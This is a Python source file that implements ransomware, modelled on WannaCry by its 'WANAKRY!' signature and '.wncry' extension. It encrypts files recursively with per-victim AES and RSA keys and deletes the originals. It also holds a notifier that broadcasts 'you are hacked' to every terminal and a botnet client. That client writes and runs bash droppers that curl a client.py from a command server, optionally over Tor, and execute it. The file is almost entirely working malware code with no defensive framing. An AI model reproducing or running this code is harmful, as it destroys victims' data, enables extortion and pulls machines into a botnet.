#!/usr/bin/env python3
# encoding :utf-8

from __future__ import annotations

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad, pad
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import glob
import subprocess
import os
import time

class Encryption:
    '''!
    @brief Encryption Class
    '''
    
    __target_folder: str = "/tmp/tmp"
    __target_file_exts: list[str] = ["txt"]
    __encrypted_file_signature: bytes = b'WANAKRY!'
    __encrypted_file_extension: str = "wncry"
    __fs_len: int = 8
    __master_pri_key: bytes
    __master_pub_key: bytes

    def setEncFileSig(self, encrypted_file_signature:str):
        self.__encrypted_file_signature = bytes(encrypted_file_signature+' ', 'utf-8')
        self.__fs_len = len(self.__encrypted_file_signature)
        return self

    def setTargetFolder(self, target_folder:str):
        self.__target_folder = target_folder
        return self

    def addTargetFileExt(self, file_ext:str):
        self.__target_file_exts.append(file_ext)
        return self

    def setEncFileExt(self, encrypted_file_extension:str):
        self.__encrypted_file_extension = encrypted_file_extension
        return self


    def saveMasterKey(self):
        priv_key, pub_key = self._generateRSAKey()

        self._saveFile("master_pub_key", pub_key)
        self._saveFile("master_priv_key", priv_key)
    
    def encryptFiles(self, master_pub_key_path: str):
        master_pub_key = self._readFile(master_pub_key_path)
        assert len(master_pub_key) > 0, "master_pub_key is empty"

        if master_pub_key:
            self.__master_pub_key = master_pub_key
        
        #create keypairs per victim
        priv_key, pub_key = self._generateRSAKey()
        enc_pri_key = self._RSAEncrypt(self.__master_pub_key, priv_key)
        self._saveFile("enc_priv_key",enc_pri_key)

        files = self._getTargetFiles(self.__target_file_exts)

        for file in files:
            if (not self._isEncrypted(file)):
                key, iv, enc_file = self._AESEncrypt(file)
                enc_key = self._RSAEncrypt(pub_key, key)
                content = enc_key + iv + enc_file
                new_file_name = file + "." + self.__encrypted_file_extension
                self._saveFile(new_file_name,self.__encrypted_file_signature+content)
                os.remove(file)
                
        
    def decryptFiles(self, master_pri_key_path:str, enc_pri_key_path:str):
        master_pri_key = self._readFile(master_pri_key_path)
        assert master_pri_key != None, "master_pri_key is needed to decryptFiles"

        assert enc_pri_key_path != None, "enc_pri_key_path is needed to decryptFiles"

        enc_pri_key = self._readFile(enc_pri_key_path)
        pri_key = self._RSADecrypt(master_pri_key, enc_pri_key)
        
        files = self._getTargetFiles([self.__encrypted_file_extension])

        for file in files:
            if (self._isEncrypted):
                file_sig, enc_key, iv, enc_file = self._readEncFile(file)
                key = self._RSADecrypt(pri_key, enc_key)
                content = self._AESDecrypt(key, iv, enc_file)

                new_file_name = file[:file.find(self.__encrypted_file_extension)-1]
                self._saveFile(new_file_name, content)
                os.remove(file)
                

    def _getTargetFiles(self, target_exts):
        files = []
        for ext in target_exts:
            pattern = self.__target_folder + "/**/*." + ext
            files.extend(glob.glob(pattern, recursive=True))
        return files


    def _AESEncrypt(self, fileName:str):
        file = self._readFile(fileName)
        key = get_random_bytes(16)
        
        cipher = AES.new(key, AES.MODE_CBC)
        enc_file = cipher.encrypt(pad(file, AES.block_size))
        
            
        return key, cipher.iv, enc_file  

    def _AESDecrypt(self, key:bytes, iv:bytes, enc_bytes:bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        dec_bytes = unpad(cipher.decrypt(enc_bytes), AES.block_size)
        return dec_bytes


############## RSA Implementation ##############

    def _generateRSAKey(self) :
        key = RSA.generate(2048)
        priv_key = key.export_key()
        pub_key = key.publickey().export_key()

        return priv_key, pub_key

    def _RSAEncrypt(self, pub_key:bytes, plain:bytes) -> bytes:
        import_pub_key = RSA.import_key(pub_key)
        cipher_rsa = PKCS1_OAEP.new(import_pub_key)
        plain_blocks = [plain[i:i+190] for i in range(0, len(plain), 190)]
        enc = b''
        
        for plain_block in plain_blocks:
            enc_block = cipher_rsa.encrypt(plain_block)
            enc += enc_block
        return enc

    def _RSADecrypt(self, pri_key:bytes, ct:bytes) -> bytes:
        ct_blocks = [ct[i:i+256] for i in range(0, len(ct), 256)]
        pt = b''
        import_pri_key = RSA.import_key(pri_key)
        cipher_rsa = PKCS1_OAEP.new(import_pri_key)

        for ct_block in ct_blocks:
            pt_block = cipher_rsa.decrypt(ct_block)
            pt += pt_block

        return pt

############## RSA Implementation Ends ##############

    def _readFile(self, fileName:str) -> bytes:
        fd = open(fileName, "rb")
        content = fd.read()
        fd.close()
        return content

    def _readEncFile(self, fileName:str):
        fs = open(fileName, "rb")
        file_sig = fs.read(self.__fs_len)
        key = fs.read(256)
        iv = fs.read(16)
        content = fs.read()
        return file_sig, key, iv, content


    def _isEncrypted(self, fileName:str) -> bool:
        file = self._readFile(fileName)
        if(file[:self.__fs_len]==self.__encrypted_file_signature):
            return True
        else:
            return False
        

    def _saveFile(self, fileName:str, content:bytes):
        file = open(fileName, "wb")
        file.write(content)
        file.close()
    
    


class Notification():
    __msg : str 

    def __init__(self, msg:str = "you are hacked"):
        self.__msg = msg

    def setMsg(self, msg:str):
        self.__msg = msg

    def _getPTSList(self):
        result = subprocess.run(["ls", "/dev/pts"], capture_output=True)
        pts_list = result.stdout.decode('utf-8').split() 
        #print(pts_list)
        return pts_list

    def notify(self, interval: int = 2, repeat_num: int = 10):
        for i in range(repeat_num):            
            pts_list = self._getPTSList()
            for pts in pts_list:
                if pts != "ptmx":
                    with open('/dev/pts/'+pts, 'w') as output:
                        subprocess.Popen(["echo", self.__msg], stdout=output)
            time.sleep(interval)
            
    def fork(self, func: notify, args: list):
        pid = os.fork()
        if pid == 0:
            if len(args)==0:
                func()
            else:
                func(args[0],args[1])
            os._exit(0)
    
class BotClient():
    BotClientFileTemplates: dict[str, str] = {}

    BotClientFileTemplates['client_dropper_runner_tor'] = '''\\
        #!/bin/bash
        url="http://$1:$2/clients/droppers/client.py"
        until curl -sHf --socks5-hostname $3:$4 "$url" -o client.py > /dev/null; do {
            echo "botnet-client: server $1:$2 not ready, waiting..."
            sleep 1
        }; done
        echo "botnet-client: server ready!"
        python3 client.py &
    '''

    BotClientFileTemplates['client_dropper_runner_default'] = '''\\
        #!/bin/bash
        url="http://$1:$2/clients/droppers/client.py"
        until curl -sHf "$url" -o client.py > /dev/null; do {
            echo "botnet-client: server $1:$2 not ready, waiting..."
            sleep 1
        }; done
        echo "botnet-client: server ready!"
        python3 client.py &
    '''

    __hs_addr:str
    __hs_port:str
    __proxy_addr:str
    __proxy_addr:str
    __supports_tor:bool = False
    
    def __init__(self, hs_addr:str, hs_port:str):
        self.__hs_addr = hs_addr
        self.__hs_port = hs_port

    def enableTor(self, proxy_addr:str, proxy_port:str):
        self.__supports_tor = True
        
        if self.__supports_tor:
            self.__proxy_addr = proxy_addr
            self.__proxy_port = proxy_port

    def _saveFile(self, fileName:str, content:str):
        file = open(fileName, "w")
        file.write(content)
        file.close()

    def save_and_run_dropper_runner(self):
        if self.__supports_tor:
            self._saveFile("/tmp/byob_client_dropper_runner", self.BotClientFileTemplates['client_dropper_runner_tor'])
            subprocess.run(["chmod", "+x", "/tmp/byob_client_dropper_runner"])
            subprocess.run(["/bin/bash", "/tmp/byob_client_dropper_runner", self.__hs_addr, self.__hs_port, self.__proxy_addr, self.__proxy_port])
        else:
            self._saveFile("/tmp/byob_client_dropper_runner", self.BotClientFileTemplates['client_dropper_runner_default'])
            subprocess.run(["chmod", "+x", "/tmp/byob_client_dropper_runner"])
            subprocess.run(["/bin/bash", "/tmp/byob_client_dropper_runner", self.__hs_addr, self.__hs_port])
 